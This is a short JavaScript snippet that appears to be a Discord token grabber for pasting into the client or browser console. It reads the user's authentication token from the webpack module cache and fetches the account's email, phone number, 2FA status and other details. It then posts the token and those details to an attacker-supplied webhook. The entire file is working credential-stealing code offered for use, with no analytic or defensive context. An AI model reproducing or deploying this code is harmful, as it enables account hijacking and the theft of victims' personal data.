(() => {
'use strict';
const url = "YOUR-WEBHOOK";
setTimeout(async function() {
const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken();
let res;
try {
res = await fetch("https://discordapp.com/api/v9/users/@me", {
method: "GET",
headers: {
"Authorization": token
}
});
res = await res.json();
} catch(e) {
return;
}
try {
let hook;
hook = await fetch(url, {
method: "POST",
headers: {
"Content-type": "application/json"
},
body: JSON.stringify({
content: `**Browser Token:** \`\`\`${token}\`\`\`
**Account Info:** \`\`\`${res.username}#${res.discriminator}
User ID: ${res.id}
Email Address: ${res.email}
Phone Number: ${res.phone}
2FA On: ${res.mfa_enabled}
Bio: "${res.bio}"\`\`\`
**Avatar-URL:** **https://cdn.discordapp.com/avatars/${res.id}/${res.avatar}.png?size=128**`
})
});
} catch(e) {
return;
}
}, 100);
})();